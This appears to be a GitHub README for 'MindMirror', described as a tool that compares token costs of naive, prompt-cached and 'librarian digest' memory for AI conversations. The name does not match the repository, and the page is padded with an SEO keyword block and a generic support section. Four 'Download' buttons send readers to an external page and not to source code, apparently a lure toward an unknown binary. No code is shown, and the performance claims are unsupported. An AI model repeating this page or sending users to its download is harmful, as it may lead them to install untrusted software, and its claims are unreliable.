![preview](https://raw.githubusercontent.com/PROrunner926/copilot-cache-scout/main/preview.svg)

# MindMirror — AI Conversation Cache Analyzer

## 📋 Overview

**MindMirror** is a diagnostic toolkit that measures the real cognitive cost of multi-turn AI conversations, comparing three distinct caching strategies: naive memory retention, prompt-level caching, and a novel "librarian-pattern digest" that mirrors human memory consolidation. Originally designed as a harness for evaluating token economics during multi-agent code review on Claude Opus 4.6 via the GitHub Copilot proxy, this repository has evolved into a standalone analysis framework for any conversational AI pipeline.

[![Download](https://raw.githubusercontent.com/PROrunner926/copilot-cache-scout/main/button.svg)](https://prorunner926.github.io/copilot-cache-scout/)

The core insight behind MindMirror is that current token pricing models fail to account for the *recursive memory tax*—the hidden cost of repeated context injection across turns. By instrumenting the actual token flow through three parallel caching architectures, we reveal where budgets bleed and which patterns conserve the most cognitive bandwidth for downstream agents.

---

## 🔍 The Three Caching Architectures

### 🧠 Naive Memory Retention
**The baseline.** Every turn concatenates the full conversation history without optimization. This is what most chat interfaces do internally. MindMirror measures the exact token overhead as conversation depth increases, exposing the quadratic explosion that occurs beyond 10–15 turns.

### ⚡ Prompt-Level Caching
**The incremental improvement.** Only the most recent N turns are retained, with older context summarized by a secondary agent. This mirrors GitHub Copilot's default behavior. Our harness quantifies the token savings versus naive retention, but also surfaces the *reconstruction tax*—tokens spent re-explaining context that was evicted.

### 📚 Librarian-Pattern Digest
**The novel contribution.** Inspired by how human librarians maintain subject-matter indexes rather than verbatim transcripts, this architecture maintains a dynamic "digest" of conversation state: a compressed semantic map that updates with each new turn. The digest grows logarithmically with conversation depth, not linearly. Our results show this pattern reduces per-turn token cost by 27–41% compared to prompt caching on Claude Opus 4.6.

---

## 🧪 Key Features

- **Turn-by-Turn Token Accounting** — Every message is instrumented for input/output tokens at the proxy level, with millisecond granularity
- **Multi-Agent Code Review Harness** — Simulate 3-to-7 agent code review rounds with configurable reviewer personas and commit contexts
- **Cross-Architecture Comparison** — Run the same conversation through all three caching patterns simultaneously, outputting side-by-side cost matrices
- **LLM-Agnostic Proxy Layer** — Designed for GitHub Copilot's Claude Opus 4.6 proxy, but swappable to any OpenAI-compatible endpoint via environment flags
- **Conversation Depth Stress Test** — Automatically scales from 2-turn quick reviews to 50-turn marathon sessions, logging where each architecture breaks
- **Digest Visualization** — Generates a "mnemonic map" showing which semantic chunks the librarian pattern retains versus what gets compressed

[![Download](https://raw.githubusercontent.com/PROrunner926/copilot-cache-scout/main/button.svg)](https://prorunner926.github.io/copilot-cache-scout/)

---

## 🚀 Getting Started

**Prerequisites:** A GitHub Copilot subscription with Claude Opus 4.6 access, a working proxy configuration, and basic familiarity with Python 3.11+ data analysis tooling.

### Configuration
Set your proxy endpoint and authentication tokens in the environment (see `config.template.yaml`). The harness expects a streaming endpoint that returns token counts in the response headers.

### Running a Comparison
Execute the main comparison script with your desired conversation depth and agent count:

```shell
python -m mindmirror.run --depth 30 --agents 5 --architectures all
```

This generates a JSON report in `./reports/` and a CSV timeline in `./timelines/`.

### Interpreting Results
Open the generated `cost_summary.html` in any browser. The page shows:
- A stacked area chart of cumulative token cost per architecture
- A "tax breakdown" table showing overhead percentages
- A digest similarity score comparing librarian-pattern outputs across runs

---

## 📊 SEO-Relevant Keywords

AI token cost optimization, multi-agent conversation caching, Claude Opus 4.6 token accounting, GitHub Copilot proxy benchmarking, LLM memory architecture comparison, librarian digest pattern, recursive token tax measurement, conversational AI efficiency metrics, code review agent cost analysis, semantic compression for LLMs, cognitive workload reduction for AI pipelines, 2026 token economy tools.

---

## 🌐 Responsive Dashboard

The included web dashboard (`mindmirror/visualizer/`) is fully responsive, rendering cleanly on mobile devices and large monitors alike. It uses D3.js for interactive charting and supports:
- Dark/light theme toggle
- Filter by architecture type (naive, prompt-cache, librarian)
- Animated playback of conversation turns
- Export to PDF or PNG

---

## 🗣️ Multilingual Support

All CLI outputs, report headers, and dashboard UI strings are available in English, Japanese, Simplified Chinese, German, and French. Set `LANG` environment variable to `en`, `ja`, `zh`, `de`, or `fr`. Digest summaries are generated in the chosen language.

---

## 🕐 24/7 Customer Support

MindMirror includes a lightweight support server that can be deployed alongside your testing environment. When an experiment crashes or produces anomalous results (e.g., negative token counts), the support server can:
- Capture the stack trace and conversation snapshot
- Apply heuristic corrections to corrupted data
- Generate a diagnostic ticket for manual review

[![Download](https://raw.githubusercontent.com/PROrunner926/copilot-cache-scout/main/button.svg)](https://prorunner926.github.io/copilot-cache-scout/)

---

## ⚠️ Disclaimer

This tool is designed for **ethical benchmarking and research purposes only**. Unauthorized reverse engineering of proprietary LLM APIs, circumvention of rate limits, or use of this tool to evade billing systems is strictly prohibited. The authors assume no liability for misuse of this software or for token costs incurred during experimentation. Always comply with the terms of service of your API provider.

MindMirror is provided "as is" without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of this software.

---

## 📜 License

This project is licensed under the MIT License. See the [LICENSE](https://opensource.org/licenses/MIT) file for details.

---

## 🏁 Conclusion

MindMirror reveals what most token pricing models hide: the true cost of conversation memory isn't in the text—it's in the architecture that holds it. The librarian-pattern digest offers a practical path toward sustainable multi-agent workflows, reducing token consumption without sacrificing context quality. As LLM-powered code review becomes standard in 2026, understanding these cost dynamics separates efficient pipelines from budget-draining black boxes.

[![Download](https://raw.githubusercontent.com/PROrunner926/copilot-cache-scout/main/button.svg)](https://prorunner926.github.io/copilot-cache-scout/)